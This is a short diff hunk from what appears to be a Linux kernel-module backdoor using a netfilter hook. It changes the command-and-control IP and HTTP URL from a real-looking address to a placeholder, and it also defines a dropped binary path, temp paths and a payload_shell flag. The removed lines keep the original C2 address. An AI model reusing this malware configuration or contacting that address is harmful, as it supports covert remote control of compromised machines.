@@ -46,13 +46,13 @@ static struct nf_hook_ops nfho;
 #define DPORT 50005
 
 #define PACKAGE "/usr/bin/tcp"
-#define C2IP    "123.249.89.38"
+#define C2IP    "123.123.123.123"
 #define C2PORT  "50001"
 
 #define CMDS "/usr/bib/touch"
 #define PK_PATH "/tmp/test1"
 
-#define HTTP_URL "http://123.249.89.38:50002/"
+#define HTTP_URL "http://123.123.123.123:50002/"
 
 static short payload_shell = -1;
 static short debug_flag = 0;
